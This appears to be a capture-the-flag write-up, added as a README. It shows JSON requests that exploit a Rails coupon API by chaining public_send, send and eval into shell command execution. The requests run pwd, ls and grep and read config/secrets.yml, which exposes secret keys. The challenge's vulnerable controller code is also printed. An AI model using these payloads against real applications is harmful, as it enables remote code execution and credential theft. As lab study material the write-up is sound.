@@ -1,0 +1,108 @@
+= README
+
+Injection in a JSON API
+
+    {"q":"find","p":1}
+    {"response":{"id":1,"coupon":"PARTYHARD2015-jff7f73h3g3jd77fj","value":0.75}}
+
+value: 0
+    {"q":"where", "p": {"value": 0}}
+    {"response":[{"id":2,"coupon":"PARTYHARD2015-h4k4d7dgeg3y6dh3h","value":0},{"id":4,"coupon":"PARTYHARD2015-ffll4kjjfj48jddjd","value":0},{"id":5,"coupon":"PARTYHARD2015-fkffkkmnnf44nrnr4","value":0},{"id":12,"coupon":"PARTYHARD2015-3993883jndndu3u38","value":0},{"id":15,"coupon":"PARTYHARD2015-mzmlala393jdndhj3","value":0}]}
+
+WHERE key = value AND k2 = v2 AND k3 = v3...
+
+    {"q":"where", "p": {"value": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]}}
+    {"response":[{"id":8,"coupon":"PARTYHARD2015-ffll4kjjfj48jddjd","note":"woot","value":2},{"id":42,"coupon":"PARTYHARD2015-sksjj4849fmccmmce","note":"you are 1337! this is the last coupon in this track, now hack elsewhere :3","value":5}]}
+
+    {"q":"send", "p": "test"}
+    {"error":"method `send' is blacklisted!"}
+
+    {"error":"can't use `find_by_sql' for a query! use `find' instead."}
+
+    {"q":"public_send", "p": "code"}
+    {"error":"undefined method `code' for Coupons:Class"}
+
+    {"q":"public_send", "p": "public_methods"}
+    {"response":["include_root_in_json","find","where","first","last","==","as_json","public_methods","send","public_send","respond_to?"]}
+
+    as_json
+    {"response":{"store":{"thread_key":"69882404401320-Coupons"},"generated_attribute_methods":{"_mutex":{}},"attribute_method_matchers_cache":{"backend":{},"default_proc":null},"records":[{"id":1,"coupon":"PARTYHARD2015-jff7f73h3g3jd77fj","value":0.75},{"id":2,"coupon":"PARTYHARD2015-h4k4d7dgeg3y6dh3h","value":0},{"id":4,"coupon":"PARTYHARD2015-ffll4kjjfj48jddjd","value":0},{"id":5,"coupon":"PARTYHARD2015-fkffkkmnnf44nrnr4","value":0},{"id":8,"coupon":"PARTYHARD2015-ffll4kjjfj48jddjd","note":"woot","value":2},{"id":12,"coupon":"PARTYHARD2015-3993883jndndu3u38","value":0},{"id":15,"coupon":"PARTYHARD2015-mzmlala393jdndhj3","value":0},{"id":42,"coupon":"PARTYHARD2015-sksjj4849fmccmmce","note":"you are 1337! this is the last coupon in this track, now hack elsewhere
+    :3","value":5}]}}
+
+getting deeper
+
+    {"q":"public_send", "p": ["send", "methods"]}
+
+and deeper
+
+    {"q":"public_send", "p": ["send", "eval", "`pwd`"]}
+    {"response":"/app\n"}
+
+ls -l
+
+    {"response":"total 60
+    dr-x------ 8 u36903 dyno 4096 Dec 16 03:44 app
+    dr-x------ 2 u36903 dyno 4096 Dec 16 03:44 bin
+    dr-x------ 6 u36903 dyno 4096 Dec 16 03:44 config
+    -r-------- 1 u36903 dyno  153 Dec 16 03:44 config.ru
+    dr-x------ 2 u36903 dyno 4096 Dec 16 03:44 db
+    -r-------- 1 u36903 dyno  981 Dec 16 03:44 Gemfile
+    -r-------- 1 u36903 dyno 3790 Dec 16 03:44 Gemfile.lock
+    dr-x------ 4 u36903 dyno 4096 Dec 16 03:44 lib
+    drwx------ 2 u36903 dyno 4096 Dec 16 03:44 log
+    dr-x------ 3 u36903 dyno 4096 Dec 16 03:44 public
+    -r-------- 1 u36903 dyno  249 Dec 16 03:44 Rakefile
+    -r-------- 1 u36903 dyno  478 Dec 16 03:44 README.rdoc
+    dr-x------ 8 u36903 dyno 4096 Dec 16 03:44 test
+    drwx------ 6 u36903 dyno 4096 Dec 16 03:44 tmp
+    dr-x------ 6 u36903 dyno 4096 Dec  9 18:51 vendor
+    "}
+
+cat config/secrets.yml:
+
+    {"response":"# Be sure to restart your server when you modify this file.\n\n#
+    Your secret key is used for verifying the integrity of signed cookies.\n# If
+    you change this key, all old signed cookies will become invalid!\n\n# Make
+    sure the secret is at least 30 characters and all random,\n# no regular words
+    or you'll be exposed to dictionary attacks.\n# You can use `rake secret` to
+    generate a secure secret key.\n\n# Make sure the secrets in this file are kept
+    private\n# if you're sharing your code publicly.\n\ndevelopment:\n
+    secret_key_base:
+    8968f25433f698766088b2cc1fb70902c5c599457b26eb4d06b9074819efea0d7ec036f488f2dc8086ab8ecc7e6ef748f0cb99f01286eced9ea0f2d21f7483af\n\ntest:\n
+    secret_key_base:
+    117e7eff8b4635dbb153396c1e58f69de3d60ce6cb4df591e8d415246ebe76ade172be580fcfc688036e3ae76c5af6ec8ac745583e4926f65bbe4242207dd4d6\n\n#
+    Do not keep production secrets in the repository,\n# instead read values from
+    the environment.\nproduction:\n  secret_key_base: \u003c%=
+    ENV[\"SECRET_KEY_BASE\"] %\u003e\n"}
+
+grep for flags
+
+    {"q":"public_send", "p": ["send", "eval", "`grep -rl PARTYHARD2015-`"]}
+
+    {"response":"config/data/coupons.yml\napp/controllers/challenge_controller.rb\n"}
+
+    {"response":"class ChallengeController \u003c ApplicationController\n\n
+    def index\n  end\n\n  def query\n    if !params.has_key?(:p) ||
+    !params.has_key?(:q)\n      render_error(\"p and q are required\")\n
+    elsif params[:q] == \"debug\"\n      render_response(\"ok, debug mode is
+    enabled.\")\n    elsif params[:q] == \"send\"\n      render_error(\"method
+    `send' is blacklisted!\")\n    elsif params[:q].start_with?(\"'\")\n
+    render_error(\"ERROR 1337 (42000): You have an error in your SQL syntax;
+    check the\" +\n        \"manual that corresponds to your MySQL server
+    version for the right syntax to use near \" +\n        \"'#{params[:q]}'
+    at line 3\")\n    elsif
+    !Coupons.public_methods.include?(params[:q].to_sym)\n
+    render_error(\"can't use `#{params[:q]}' for a query! use `find'
+    instead.\")\n    else\n      args = Array.wrap(params[:p])\n      while
+    args.any?{ |arg| arg.is_a?(String) \u0026\u0026 arg.include?('chmod') }\n
+    args = args.map{ |arg| arg.is_a?(String) ? arg.gsub(/chmod/i, 'nope') :
+    arg }\n      end\n      puts \"SENDING: #{params[:q]} #{args}\"\n      r =
+    Coupons.public_send(params[:q], *args)\n      render_response(r)\n
+    end\n  rescue =\u003e e\n    render_error(e.message)\n  end\n\n  def
+    partyhardhereisyour20dollarsdiscount\n
+    render_response(\"PARTYHARD2015-njhejdi838jehejdk\")\n  end\n\n
+    private\n\n  def render_error(message)\n    render json: {error: message},
+    status: :unprocessable_entity\n  end\n\n  def render_response(message)\n
+    render json: {response: message}, status: :ok\n  end\nend\n"}
+
+poke directly for the lulz
